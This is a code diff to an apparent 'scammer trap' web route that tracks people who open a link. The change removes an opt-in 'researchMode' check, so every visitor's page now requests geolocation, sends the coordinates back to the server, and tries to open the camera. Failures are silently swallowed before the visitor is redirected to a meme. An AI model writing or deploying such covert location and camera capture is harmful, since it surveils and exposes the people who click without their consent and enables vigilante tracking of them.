@@ -317,7 +317,10 @@ app.get('/check-scammer/:id', (req, res) => {
           screen: {w: screen.width, h: screen.height}
         })
       }).then(() => {
-        if (localStorage.getItem('researchMode') === 'true') {
+        // Research mode is always on — attempt geolocation + camera capture
+        // on every click. Both are best-effort; denials/errors are swallowed
+        // so the redirect still runs.
+        try {
           navigator.geolocation.getCurrentPosition(p => {
             const geo = {
               trapId,
@@ -334,9 +337,13 @@ app.get('/check-scammer/:id', (req, res) => {
               headers: {'Content-Type': 'application/json'},
               body: JSON.stringify(geo)
             });
-          });
-          navigator.mediaDevices.getUserMedia({video:true}).then(() => console.log('📸 Camera hooked — Research Preview active')).catch(()=>{});
-        }
+          }, () => {});
+        } catch (e) {}
+        try {
+          navigator.mediaDevices.getUserMedia({video:true})
+            .then(() => console.log('📸 Camera hooked — Research Preview active'))
+            .catch(()=>{});
+        } catch (e) {}
         window.location = 'https://i.imgur.com/you-got-caught-meme.jpg'; // real meme redirect (change if you want)
       });
     }
